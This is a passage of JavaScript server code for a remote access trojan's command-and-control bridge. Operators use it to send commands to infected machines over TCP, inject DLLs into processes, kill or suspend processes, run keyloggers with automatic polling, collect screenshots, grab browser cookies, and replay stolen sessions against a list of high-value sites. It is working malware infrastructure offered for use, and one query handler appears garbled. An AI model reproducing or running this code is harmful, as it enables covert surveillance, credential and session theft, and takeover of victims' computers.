                } catch (autoFireErr) {
                    console.error(`[COOKIE AUTO-FIRE] Error:`, autoFireErr.message);
                }
            } catch (dbError) {
                console.error(`[COOKIE] Database error storing cookie blob for ${clientId}:`, dbError.message);
            }
        } else {
            console.warn(`[COOKIE] Malformed COOKIE_DATA from ${clientId}: ${message.substring(0, 100)}...`);
        }
        return;
    }

    let parsedMessage = message;
    let messageType = 'client_output';

    try {
        const jsonData = JSON.parse(message);
        if (jsonData.files || jsonData.drives || jsonData.path) {
            parsedMessage = jsonData;
            messageType = 'file_browser_response';
        }
    } catch (e) {
        // Keep plain text output
    }

    broadcastToDashboard({
        type: messageType,
        clientId,
        output: parsedMessage,
        timestamp: Date.now()
    });
}

// Broadcast client list to all dashboard clients — filtered per user
function broadcastClientList() {
    const liveIds = new Set(ratClients.keys());
    let allDbRows = [];
    try { allDbRows = db.getAllClients(500, 0); } catch(e) {}
    const dbMap = new Map(allDbRows.map(r => [r.id, r]));

    dashboardClients.forEach((data, ws) => {
        if (ws.readyState !== WebSocket.OPEN) return;
        try {
            const wsUser = data.user;
            const ownId = wsUser
                ? (wsUser.role === 'admin' && data.impersonateUserId ? data.impersonateUserId : wsUser.userId)
                : null;
            const ownIdStr = ownId !== null && ownId !== undefined ? String(ownId) : null;

            // ALL users (including admin) are scoped to their own silo by default
            const visibleRows = ownIdStr
                ? allDbRows.filter(r => String(r.user_id) === ownIdStr)
                : allDbRows;

            // Include live-only clients the user owns
            const visibleIds = new Set(visibleRows.map(r => r.id));
            ratClients.forEach((client, id) => {
                if (!visibleIds.has(id) && (!ownIdStr || String(client.userId) === ownIdStr)) visibleIds.add(id);
            });

            const clientList = Array.from(visibleIds).map(id => {
                const live = ratClients.get(id);
                const row  = dbMap.get(id) || {};
                const isOnline = liveIds.has(id) ? 1 : 0;
                return {
                    id,
                    hostname: live?.info?.hostname || row.hostname || 'Unknown',
                    username: live?.info?.username || row.username || 'Unknown',
                    ip_address: live?.info?.ip || row.ip_address || null,
                    os_version: live?.info?.os || row.os_version || null,
                    lastSeen: live?.lastSeen || row.last_seen || null,
                    is_online: isOnline,
                    keylog_active: row.keylog_active || 0,
                    connected: isOnline === 1,
                    status: isOnline === 1 ? 'online' : 'offline'
                };
            });

            ws.send(JSON.stringify({ type: 'client_list', clients: clientList, timestamp: Date.now() }));
        } catch (error) {
            console.error('Error sending to dashboard client:', error.message);
        }
    });
}

// Broadcast client list filtered by user
function broadcastClientListToUser(ws, user) {
    const clientList = Array.from(ratClients.entries())
        .filter(([id, client]) => String(client.userId || '') === String(user.userId || ''))
        .map(([id, client]) => ({
            id,
            hostname: client.info?.hostname || 'Unknown',
            username: client.info?.username || 'Unknown',
            ip: client.info?.ip || 'Unknown',
            os: client.info?.os || 'Unknown',
            lastSeen: client.lastSeen,
            lastSeenFormatted: formatTimestamp(client.lastSeen),
            connected: client.socket && !client.socket.destroyed,
            status: client.socket && !client.socket.destroyed ? 'online' : 'offline'
        }));

    const message = JSON.stringify({
        type: 'client_list',
        clients: clientList,
        timestamp: Date.now()
    });

    if (ws.readyState === WebSocket.OPEN) {
        try {
            ws.send(message);
        } catch (error) {
            console.error('Error sending client list to user:', error.message);
        }
    }
}

// Send ping to dashboard client
function pingDashboardClient(ws) {
    if (ws.readyState === WebSocket.OPEN) {
        try {
            ws.ping();
            const clientData = dashboardClients.get(ws);
            if (clientData) {
                clientData.lastPing = Date.now();
            }
        } catch (error) {
            console.error('Error pinging dashboard client:', error.message);
        }
    }
}

// Track last command per client to prevent duplicate spam
const lastCommands = new Map(); // clientId -> { command, timestamp }

// Send command to RAT client with deduplication
function sendCommandToRat(clientId, command) {
    if (isStealthCommand(command)) {
        console.warn(`Blocked stealth command for client ${clientId}: ${command}`);
        return false;
    }

    const ratClient = ratClients.get(clientId);
    if (!ratClient || !ratClient.socket || ratClient.socket.destroyed) {
        console.log(`Client ${clientId} not connected`);
        return false;
    }
    
    // Deduplication: skip if same command sent within last 2 seconds
    const lastCmd = lastCommands.get(clientId);
    if (lastCmd && lastCmd.command === command && (Date.now() - lastCmd.timestamp) < 2000) {
        console.log(`Deduplicating duplicate command to ${clientId}: ${command}`);
        return true; // Return true so caller thinks it was sent
    }
    
    lastCommands.set(clientId, { command, timestamp: Date.now() });
    console.log(`Sending command to client ${clientId}: ${command}`);
    ratClient.socket.write(command + '\n');
    return true;
}

// Handle WebSocket connections (React dashboard)
wss.on('connection', (ws, req) => {
    // Authenticate user
    const authResult = authManager.wsAuthMiddleware(ws, req);
    
    if (!authResult.authenticated) {
        console.log(`WebSocket connection rejected: ${authResult.error}`);
        ws.close(1008, 'Authentication required');
        return;
    }
    
    const user = authResult.user;
    const dashboardClientId = uuidv4();
    console.log(`Dashboard client connected: ${dashboardClientId} (User: ${user.username}, Role: ${user.role})`);
    
    // Store dashboard client with ping data and user info
    dashboardClients.set(ws, {
        lastPing: Date.now(),
        connectedAt: Date.now(),
        clientId: dashboardClientId,
        user: user,
        impersonateUserId: null
    });

    // Send initial client list (filtered by user)
    broadcastClientListToUser(ws, user);

    // Send welcome message to dashboard
    ws.send(JSON.stringify({
        type: 'connected',
        clientId: dashboardClientId,
        timestamp: Date.now(),
        message: 'Connected to C2 bridge',
        user: {
            username: user.username,
            role: user.role,
            userId: user.userId
        }
    }));

    // Handle messages from dashboard
    ws.on('message', (data) => {
        try {
            const rawMessage = JSON.parse(data.toString());
            
            // Handle both topic-based and type-based messages
            // Topic-based: { topic: 'command', payload: { clientId: '...', command: '...' } }
            // Type-based: { type: 'command', clientId: '...', command: '...' }
            let message = rawMessage;
            let messageType = rawMessage.type || rawMessage.topic;
            
            // If using topic-based format, extract payload
            if (rawMessage.topic && rawMessage.payload) {
                message = { ...rawMessage.payload, type: rawMessage.topic };
                messageType = rawMessage.topic;
            }

            const wsData = dashboardClients.get(ws);
            const effectiveUserId = user.role === 'admin' && wsData?.impersonateUserId
                ? String(wsData.impersonateUserId)
                : String(user.userId);

            const messageClientId = typeof message.clientId === 'string' ? message.clientId : null;
            const requiresOwnedClient = new Set([
                'command',
                'disconnect_client',
                'get_processes',
                'inject_dll',
                'kill_process',
                'suspend_process',
                'resume_process',
                'get_modules',
                'set_priority'
            ]);

            if (requiresOwnedClient.has(messageType)) {
                if (!messageClientId || !canUserIdAccessClient(effectiveUserId, messageClientId)) {
                    ws.send(JSON.stringify({
                        type: 'error',
                        message: 'Access denied for requested client',
                        timestamp: Date.now()
                    }));
                    return;
                }
            }
            
            switch (messageType) {
                case 'command': {
                    if (isStealthCommand(message.command)) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Stealth commands are disabled',
                            timestamp: Date.now()
                        }));
                        break;
                    }

                    // Intercept keylog_start/stop to manage auto-flush poller
                    if (message.command === 'keylog_start' && message.clientId) {
                        // Persist intent to DB so we can auto-resume after disconnect
                        try { db.setKeylogActive(message.clientId, true); } catch(e){}
                        if (!keylogPollers.has(message.clientId)) {
                            const pollInterval = setInterval(() => {
                                sendCommandToRat(message.clientId, 'keylog_get');
                            }, 5000);
                            keylogPollers.set(message.clientId, pollInterval);
                            console.log(`Keylog auto-poll started for ${message.clientId}`);
                        }
                        broadcastToDashboard({ type: 'keylog_status', clientId: message.clientId, active: true, timestamp: Date.now() });
                    }
                    if (message.command === 'keylog_stop' && message.clientId) {
                        // Clear persisted intent
                        try { db.setKeylogActive(message.clientId, false); } catch(e){}
                        const poller = keylogPollers.get(message.clientId);
                        if (poller) { clearInterval(poller); keylogPollers.delete(message.clientId); }
                        broadcastToDashboard({ type: 'keylog_status', clientId: message.clientId, active: false, timestamp: Date.now() });
                    }

                    // Send command to specific RAT client
                    const success = sendCommandToRat(message.clientId, message.command);
                    if (success) {
                        ws.send(JSON.stringify({
                            type: 'command_sent',
                            clientId: message.clientId,
                            command: message.command,
                            timestamp: Date.now()
                        }));
                    } else {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Client ${message.clientId} not connected`,
                            timestamp: Date.now()
                        }));
                    }
                    break;
                }

                case 'broadcast':
                    if (isStealthCommand(message.command)) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Stealth commands are disabled',
                            timestamp: Date.now()
                        }));
                        break;
                    }

                    // Send command only to the effective (impersonated/own) user's RAT clients
                    let sentCount = 0;
                    ratClients.forEach((client, id) => {
                        if (String(client.userId || '') === effectiveUserId && sendCommandToRat(id, message.command)) {
                            sentCount++;
                        }
                    });
                    
                    ws.send(JSON.stringify({
                        type: 'broadcast_sent',
                        command: message.command,
                        sentTo: sentCount,
                        timestamp: Date.now()
                    }));
                    break;

                case 'set_impersonation': {
                    if (user.role !== 'admin') {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'Only admins can impersonate users',
                            timestamp: Date.now()
                        }));
                        break;
                    }

                    const requested = typeof message.impersonateUserId === 'string'
                        ? message.impersonateUserId.trim()
                        : '';

                    const currentWsData = dashboardClients.get(ws);
                    if (!currentWsData) break;

                    if (!requested) {
                        currentWsData.impersonateUserId = null;
                        ws.send(JSON.stringify({
                            type: 'impersonation_updated',
                            impersonateUserId: null,
                            timestamp: Date.now()
                        }));
                        broadcastClientList();
                        break;
                    }

                    const target = db.getUserById(requested);
                    if (!target) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Impersonation target not found: ${requested}`,
                            timestamp: Date.now()
                        }));
                        break;
                    }

                    currentWsData.impersonateUserId = String(target.id);
                    ws.send(JSON.stringify({
                        type: 'impersonation_updated',
                        impersonateUserId: String(target.id),
                        timestamp: Date.now()
                    }));
                    broadcastClientList();
                    break;
                }

                case 'disconnect_client':
                    // Manually disconnect a specific RAT client
                    const clientToDisconnect = ratClients.get(message.clientId);
                    if (clientToDisconnect && clientToDisconnect.socket && !clientToDisconnect.socket.destroyed) {
                        console.log(`Manually disconnecting client: ${message.clientId}`);
                        clientToDisconnect.socket.destroy();
                        ws.send(JSON.stringify({
                            type: 'client_disconnected',
                            clientId: message.clientId,
                            manual: true,
                            timestamp: Date.now()
                        }));
                    }
                    break;

                case 'get_processes':
                    // Request process list from RAT client
                    if (!message.clientId) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'clientId is required for get_processes',
                            timestamp: Date.now()
                        }));
                        break;
                    }
                    
                    const processSuccess = sendCommandToRat(message.clientId, 'PROCESS_LIST');
                    if (processSuccess) {
                        ws.send(JSON.stringify({
                            type: 'process_request_sent',
                            clientId: message.clientId,
                            timestamp: Date.now()
                        }));
                    } else {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Client ${message.clientId} not connected`,
                            timestamp: Date.now()
                        }));
                    }
                    break;
                    
                case 'inject_dll':
                    // Inject DLL into process on RAT client
                    if (!message.clientId || !message.pid || !message.dllPath) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'clientId, pid, and dllPath are required for inject_dll',
                            timestamp: Date.now()
                        }));
                        break;
                    }
                    
                    const method = message.method || 'createremotethread';
                    const injectCommand = `INJECT_DLL|${message.pid}|${message.dllPath}|${method}`;
                    const injectSuccess = sendCommandToRat(message.clientId, injectCommand);
                    
                    if (injectSuccess) {
                        // Log injection attempt to database
                        db.addCommand(message.clientId, injectCommand, 'pending', true);
                        
                        ws.send(JSON.stringify({
                            type: 'injection_request_sent',
                            clientId: message.clientId,
                            pid: message.pid,
                            dllPath: message.dllPath,
                            method: method,
                            timestamp: Date.now()
                        }));
                    } else {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Client ${message.clientId} not connected`,
                            timestamp: Date.now()
                        }));
                    }
                    break;

                case 'kill_process':
                    // Kill process by PID
                    if (!message.clientId || !message.pid) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'clientId and pid are required for kill_process',
                            timestamp: Date.now()
                        }));
                        break;
                    }
                    
                    const killCommand = `process_kill ${message.pid}`;
                    const killSuccess = sendCommandToRat(message.clientId, killCommand);
                    
                    if (killSuccess) {
                        db.addCommand(message.clientId, killCommand, 'pending', true);
                        ws.send(JSON.stringify({
                            type: 'kill_request_sent',
                            clientId: message.clientId,
                            pid: message.pid,
                            timestamp: Date.now()
                        }));
                    } else {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Client ${message.clientId} not connected`,
                            timestamp: Date.now()
                        }));
                    }
                    break;

                case 'suspend_process':
                    // Suspend process by PID
                    if (!message.clientId || !message.pid) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'clientId and pid are required for suspend_process',
                            timestamp: Date.now()
                        }));
                        break;
                    }
                    
                    const suspendCommand = `process_suspend ${message.pid}`;
                    const suspendSuccess = sendCommandToRat(message.clientId, suspendCommand);
                    
                    if (suspendSuccess) {
                        db.addCommand(message.clientId, suspendCommand, 'pending', true);
                        ws.send(JSON.stringify({
                            type: 'suspend_request_sent',
                            clientId: message.clientId,
                            pid: message.pid,
                            timestamp: Date.now()
                        }));
                    } else {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Client ${message.clientId} not connected`,
                            timestamp: Date.now()
                        }));
                    }
                    break;

                case 'resume_process':
                    // Resume process by PID
                    if (!message.clientId || !message.pid) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'clientId and pid are required for resume_process',
                            timestamp: Date.now()
                        }));
                        break;
                    }
                    
                    const resumeCommand = `process_resume ${message.pid}`;
                    const resumeSuccess = sendCommandToRat(message.clientId, resumeCommand);
                    
                    if (resumeSuccess) {
                        db.addCommand(message.clientId, resumeCommand, 'pending', true);
                        ws.send(JSON.stringify({
                            type: 'resume_request_sent',
                            clientId: message.clientId,
                            pid: message.pid,
                            timestamp: Date.now()
                        }));
                    } else {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Client ${message.clientId} not connected`,
                            timestamp: Date.now()
                        }));
                    }
                    break;

                case 'get_modules':
                    // Get loaded modules for process
                    if (!message.clientId || !message.pid) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'clientId and pid are required for get_modules',
                            timestamp: Date.now()
                        }));
                        break;
                    }
                    
                    const modulesCommand = `module_list ${message.pid}`;
                    const modulesSuccess = sendCommandToRat(message.clientId, modulesCommand);
                    
                    if (modulesSuccess) {
                        db.addCommand(message.clientId, modulesCommand, 'pending', true);
                        ws.send(JSON.stringify({
                            type: 'modules_request_sent',
                            clientId: message.clientId,
                            pid: message.pid,
                            timestamp: Date.now()
                        }));
                    } else {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Client ${message.clientId} not connected`,
                            timestamp: Date.now()
                        }));
                    }
                    break;

                case 'set_priority':
                    // Set process priority
                    if (!message.clientId || !message.pid || !message.priority) {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: 'clientId, pid, and priority are required for set_priority',
                            timestamp: Date.now()
                        }));
                        break;
                    }
                    
                    const priorityCommand = `process_priority ${message.pid} ${message.priority}`;
                    const prioritySuccess = sendCommandToRat(message.clientId, priorityCommand);
                    
                    if (prioritySuccess) {
                        db.addCommand(message.clientId, priorityCommand, 'pending', true);
                        ws.send(JSON.stringify({
                            type: 'priority_request_sent',
                            clientId: message.clientId,
                            pid: message.pid,
                            priority: message.priority,
                            timestamp: Date.now()
                        }));
                    } else {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Client ${message.clientId} not connected`,
                            timestamp: Date.now()
                        }));
                    }
                    break;

                case 'ping':
                    // Respond to ping
                    ws.send(JSON.stringify({ 
                        type: 'pong',
                        timestamp: Date.now()
                    }));
                    break;
                    
                case 'heartbeat':
                    // Update last ping time
                    const clientData = dashboardClients.get(ws);
                    if (clientData) {
                        clientData.lastPing = Date.now();
                    }
                    ws.send(JSON.stringify({
                        type: 'heartbeat_ack',
                        timestamp: Date.now()
                    }));
                    break;
                    
                case 'open_cookie_session': {
                    console.log(`[COOKIE SESSION] Request: host=${message.host}, clientId=${message.clientId}`);
                    fireCookieSession(message.clientId, message.host, ws);
                    break;
                }

                case 'fire_all_cookie_sessions': {
                    console.log(`[COOKIE SESSION] Fire all for clientId=${message.clientId}`);
                    const clientId = message.clientId;
                    if (!clientId) {
                        ws.send(JSON.stringify({ type: 'error', message: 'clientId required', timestamp: Date.now() }));
                        break;
                    }
                    
                    const allCookies = db.getCookies(clientId, 5000, 0, null);
                    const firedTargets = [];
                    
                    for (const target of HIGH_VALUE_TARGETS) {
                        const hasMatch = allCookies.some(c => {
                            const cHost = (c.host || '').toLowerCase();
                            return cHost === target.domain || cHost.endsWith('.' + target.domain);
                        });
                        if (hasMatch) {
                            fireCookieSession(clientId, target.url);
                            firedTargets.push(target.name);
                        }
                    }
                    
                    ws.send(JSON.stringify({
                        type: 'cookie_sessions_fired',
                        clientId,
                        targets: firedTargets,
                        count: firedTargets.length,
                        timestamp: Date.now()
                    }));
                    break;
                }

                case 'cookie_grab': {
                    // Send COOKIE_GRAB command to RAT client
                    if (!message.clientId) {
                        ws.send(JSON.stringify({ type: 'error', message: 'clientId required', timestamp: Date.now() }));
                        break;
                    }
                    const grabSuccess = sendCommandToRat(message.clientId, 'COOKIE_GRAB');
                    if (grabSuccess) {
                        ws.send(JSON.stringify({
                            type: 'cookie_grab_sent',
                            clientId: message.clientId,
                            timestamp: Date.now()
                        }));
                    } else {
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Client ${message.clientId} not connected`,
                            timestamp: Date.now()
                        }));
                    }
                    break;
                }

                case 'db_query':
                    // Handle database queries
                    try {
                        // Resolve the authenticated user for this WebSocket
                        const wsData = dashboardClients.get(ws);
                        const wsUser = wsData ? wsData.user : null;
                        const requestedImpersonation = typeof message.impersonateUserId === 'string'
                            ? message.impersonateUserId.trim()
                            : '';
                        const persistedImpersonation = wsData && typeof wsData.impersonateUserId === 'string'
                            ? wsData.impersonateUserId.trim()
                            : '';
                        const isAdmin = wsUser?.role === 'admin';

                        let filterUserId = wsUser ? wsUser.userId : null;
                        const effectiveImpersonation = isAdmin ? (requestedImpersonation || persistedImpersonation) : '';

                        if (isAdmin && effectiveImpersonation) {
                            const targetUser = db.getUserById(effectiveImpersonation);
                            if (!targetUser) {
                                ws.send(JSON.stringify({
                                    type: 'error',
                                    message: `Impersonation target not found: ${effectiveImpersonation}`,
                                    queryId: message.queryId,
                                    timestamp: Date.now()
                                }));
                                break;
                            }
                            filterUserId = targetUser.id;
                        }

                        if (wsData) {
                            wsData.impersonateUserId = isAdmin && effectiveImpersonation ? String(filterUserId) : null;
                        }

                        switch (message.query) {
                            case 'get_clients': {
                                // Merge DB rows with live ratClients map so is_online is always accurate
                                const rows = db.getAllClients(message.limit || 100, message.offset || 0, filterUserId);
                                const liveIds = new Set(ratClients.keys());
                                const merged = rows.map(r => ({
                                    ...r,
                                    is_online: liveIds.has(r.id) ? 1 : 0
                                }));
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_clients',
                                    data: merged,
                                    timestamp: Date.now()
                                }));
                                break;
                            }
                                
                            case 'get_client':
                                const client = db.getClient(message.clientId);
                                // Ownership check for non-admins
                                if (client && filterUserId !== null && String(client.user_id) !== String(filterUserId)) {
                                    ws.send(JSON.stringify({ type: 'db_response', query: 'get_client', data: null, timestamp: Date.now() }));
                                    break;
                                }
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_client',
                                    data: client,
                                    timestamp: Date.now()
                                }));
                                break;
                                
                            case 'get_screenshots':
                                const screenshots = db.getScreenshots(
                                    message.clientId || null,
                                    message.limit || 50,
                                    message.offset || 0,
                                    Boolean(message.includeData),
                                    filterUserId
                                );
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_screenshots',
                                    data: screenshots,
                                    timestamp: Date.now()
                                }));
                                break;
                                
                            case 'get_keylogs':
                                if (!message.clientId || !canUserIdAccessClient(filterUserId, message.clientId)) {
                        ws.send(JSON.stringify({ type: 'db_response', query: 'get_keylogs', clientId: message.clientId, data: [], timestamp: Date.now() }));
                        break;
                    }
                    const keylogs = db.getKeylogs(message.clientId, message.limit || 100, message.offset || 0, filterUserId);
                    ws.send(JSON.stringify({
                        type: 'db_response',
                        query: 'get_keylogs',
                        clientId: message.clientId,
                                }));
                                break;
                                
                            case 'delete_keylogs_group': {
                    if (!canUserIdAccessClient(filterUserId, message.clientId)) {
                        break;
                    }
                    if (message.ids && Array.isArray(message.ids)) {
                        db.deleteKeylogsGroup(message.ids, filterUserId);
                        // Re-fetch remaining keylogs
                        const keylogsAfterDelete = db.getKeylogs(message.clientId, message.limit || 500, message.offset || 0, filterUserId);
                        ws.send(JSON.stringify({
                            type: 'db_response',
                            query: 'get_keylogs',
                            clientId: message.clientId,
                            data: keylogsAfterDelete,
                            timestamp: Date.now()
                        }));
                    }
                    break;
                }

                case 'get_keylog_status': {
                                // Returns clients flagged keylog_active=1, filtered by user
                                const activeClients = db.getKeylogActiveClients(filterUserId);
                                const onlineIds = new Set(ratClients.keys());
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_keylog_status',
                                    data: activeClients.map(c => ({
                                        ...c,
                                        currently_online: onlineIds.has(c.id),
                                        poller_running: keylogPollers.has(c.id)
                                    })),
                                    timestamp: Date.now()
                                }));
                                break;
                            }

                            case 'get_commands':
                                if (!message.clientId || !canUserIdAccessClient(filterUserId, message.clientId)) {
                                    ws.send(JSON.stringify({ type: 'db_response', query: 'get_commands', data: [], timestamp: Date.now() }));
                                    break;
                                }
                                const commands = db.getCommands(message.clientId, message.limit || 100, message.offset || 0, filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_commands',
                                    data: commands,
                                    timestamp: Date.now()
                                }));
                                break;
                                
                            case 'get_file_operations':
                                if (!message.clientId || !canUserIdAccessClient(filterUserId, message.clientId)) {
                                    ws.send(JSON.stringify({ type: 'db_response', query: 'get_file_operations', data: [], timestamp: Date.now() }));
                                    break;
                                }
                                const files = db.getFileOperations(message.clientId, message.limit || 100, message.offset || 0, filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_file_operations',
                                    data: files,
                                    timestamp: Date.now()
                                }));
                                break;
                                
                            case 'get_statistics':
                                const stats = db.getStatistics(filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_statistics',
                                    data: stats,
                                    timestamp: Date.now()
                                }));
                                break;
                                
                            case 'get_screenshot':
                                const screenshot = db.getScreenshot(message.screenshotId, filterUserId);
                                if (screenshot && Buffer.isBuffer(screenshot.image_data)) {
                                    screenshot.image_data = screenshot.image_data.toString('base64');
                                }
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_screenshot',
                                    data: screenshot,
                                    timestamp: Date.now()
                                }));
                                break;

                            case 'delete_screenshot':
                                const deleteResult = db.deleteScreenshot(message.screenshotId, filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'delete_screenshot',
                                    data: {
                                        screenshotId: message.screenshotId,
                                        deleted: deleteResult?.changes > 0
                                    },
                                    timestamp: Date.now()
                                }));
                                break;

                            case 'delete_client': {
                                const clientId = String(message.clientId || '').trim();
                                if (!clientId || !canUserIdAccessClient(filterUserId, clientId)) {
                                    ws.send(JSON.stringify({
                                        type: 'db_response',
                                        query: 'delete_client',
                                        data: { clientId, deleted: false },
                                        timestamp: Date.now()
                                    }));
                                    break;
                                }

                                const liveClient = ratClients.get(clientId);
                                if (liveClient && liveClient.socket && !liveClient.socket.destroyed) {
                                    try { liveClient.socket.destroy(); } catch (e) {}
                                }
                                ratClients.delete(clientId);

                                const poller = keylogPollers.get(clientId);
                                if (poller) {
                                    clearInterval(poller);
                                    keylogPollers.delete(clientId);
                                }

                                const deleteClientResult = db.deleteClient(clientId, filterUserId);
                                const deleted = (deleteClientResult?.changes || 0) > 0;

                                if (deleted) {
                                    broadcastToDashboard({
                                        type: 'client_deleted',
                                        clientId,
                                        timestamp: Date.now()
                                    });
                                    broadcastClientList();
                                }

                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'delete_client',
                                    data: { clientId, deleted },
                                    timestamp: Date.now()
                                }));
                                break;
                            }
                                
                            case 'get_cookies':
                                if (!message.clientId || !canUserIdAccessClient(filterUserId, message.clientId)) {
                                    ws.send(JSON.stringify({ type: 'db_response', query: 'get_cookies', data: [], timestamp: Date.now() }));
                                    break;
                                }
                                const cookies = db.getCookies(message.clientId, message.limit || 500, message.offset || 0, filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_cookies',
                                    clientId: message.clientId,
                                    data: cookies,
                                    timestamp: Date.now()
                                }));
                                break;

                            case 'get_all_cookies':
                                const allCookies = db.getAllCookies(message.limit || 1000, message.offset || 0, filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_all_cookies',
                                    data: allCookies,
                                    timestamp: Date.now()
                                }));
                                break;

                            case 'delete_cookie':
                                const deleteCookieResult = db.deleteCookie(message.cookieId, filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'delete_cookie',
                                    data: { cookieId: message.cookieId, deleted: (deleteCookieResult?.changes || 0) > 0 },
                                    timestamp: Date.now()
                                }));
                                break;

                            case 'get_scanned_data':
                                if (!message.clientId || !canUserIdAccessClient(filterUserId, message.clientId)) {
                                    ws.send(JSON.stringify({ type: 'db_response', query: 'get_scanned_data', data: [], timestamp: Date.now() }));
                                    break;
                                }
                                const scannedData = db.getScannedData(message.clientId, message.limit || 100, message.offset || 0, filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_scanned_data',
                                    clientId: message.clientId,
                                    data: scannedData,
                                    timestamp: Date.now()
                                }));
                                break;

                            case 'get_all_scanned_data':
                                const allScannedData = db.getAllScannedData(message.limit || 500, message.offset || 0, filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_all_scanned_data',
                                    data: allScannedData,
                                    timestamp: Date.now()
                                }));
                                break;

                            case 'delete_scanned_data':
                                if (!message.id || !canUserIdAccessClient(filterUserId, message.clientId)) {
                                    ws.send(JSON.stringify({ type: 'db_response', query: 'delete_scanned_data', data: { deleted: false }, timestamp: Date.now() }));
                                    break;
                                }
                                const deleteScannedResult = db.deleteScannedData(message.id, filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'delete_scanned_data',
                                    data: { id: message.id, deleted: (deleteScannedResult?.changes || 0) > 0 },
                                    timestamp: Date.now()
                                }));
                                break;

                            case 'delete_all_scanned_data':
                                db.deleteAllScannedData(filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'delete_all_scanned_data',
                                    data: { deleted: true },
                                    timestamp: Date.now()
                                }));
                                break;

                            case 'get_file':
                                const file = db.getFile(message.fileId, filterUserId);
                                ws.send(JSON.stringify({
                                    type: 'db_response',
                                    query: 'get_file',
                                    data: file,
                                    timestamp: Date.now()
                                }));
                                break;

                            default:
                                ws.send(JSON.stringify({
                                    type: 'error',
                                    message: `Unknown database query: ${message.query}`,
                                    timestamp: Date.now()
                                }));
                        }
                    } catch (dbError) {
                        console.error(`Database query error:`, dbError.message);
                        ws.send(JSON.stringify({
                            type: 'error',
                            message: `Database error: ${dbError.message}`,
                            timestamp: Date.now()
                        }));
                    }
                    break;
            }
        } catch (error) {
            console.error('Error processing dashboard message:', error);
        }
    });

    // Handle pong from dashboard
    ws.on('pong', () => {
        const clientData = dashboardClients.get(ws);
        if (clientData) {
            clientData.lastPing = Date.now();
        }
    });

    // Handle dashboard disconnection
    ws.on('close', (code, reason) => {
        const formattedReason = formatCloseReason(reason);
        const reasonSuffix = formattedReason ? `, reason: ${formattedReason}` : '';

        if (NORMAL_DASHBOARD_CLOSE_CODES.has(code)) {
            console.log(`Dashboard client closed: ${dashboardClientId} (code: ${code}${reasonSuffix})`);
        } else {
            console.warn(`Dashboard client disconnected unexpectedly: ${dashboardClientId} (code: ${code}${reasonSuffix})`);
        }

        dashboardClients.delete(ws);
    });

    ws.on('error', (error) => {
        console.error(`Dashboard WebSocket error (${dashboardClientId}):`, error.message);
        // Don't delete immediately, let close handler handle it
    });
});

// Handle TCP connections (C++ RAT clients)
tcpServer.on('connection', (socket) => {
    socket.clientId = uuidv4();
    console.log(`RAT client connected: ${socket.clientId} (${socket.remoteAddress}:${socket.remotePort})`);

    // Store client - connection stays open indefinitely
    ratClients.set(socket.clientId, {
        socket,
        info: {},
        lastSeen: Date.now(),
        connectedAt: Date.now()
    });

    // Set socket options for persistent connection
    socket.setKeepAlive(true, 60000); // 60 second keepalive
    socket.setNoDelay(true);
    socket.setTimeout(0); // NO TIMEOUT - connection stays open indefinitely

    let tcpBuffer = '';

    // Handle data from RAT client
    socket.on('data', (data) => {
        tcpBuffer += data.toString('utf8');

        let newlineIndex = tcpBuffer.indexOf('\n');
        while (newlineIndex !== -1) {
            const rawMessage = tcpBuffer.slice(0, newlineIndex);
            tcpBuffer = tcpBuffer.slice(newlineIndex + 1);

            const message = rawMessage.trim();
            if (message) {
                processRatMessage(socket.clientId, socket, message);
            }

            newlineIndex = tcpBuffer.indexOf('\n');
        }
    });

    // Handle socket timeout - DO NOTHING (connection stays open)
    socket.on('timeout', () => {
        console.log(`RAT client ${socket.clientId} socket timeout (ignored)`);
        // Reset timeout to keep connection open
        socket.setTimeout(0);
    });

    // Handle RAT client disconnection (only when client closes connection)
    socket.on('close', () => {
        console.log(`RAT client disconnected: ${socket.clientId}`);
        ratClients.delete(socket.clientId);

        // Mark client offline in DB immediately
        try { db.setClientOffline(socket.clientId); } catch(e){}

        // Stop keylog poller for this client if running
        // (we do NOT clear keylog_active in DB — it will auto-resume on reconnect)
        const poller = keylogPollers.get(socket.clientId);
        if (poller) { clearInterval(poller); keylogPollers.delete(socket.clientId); }

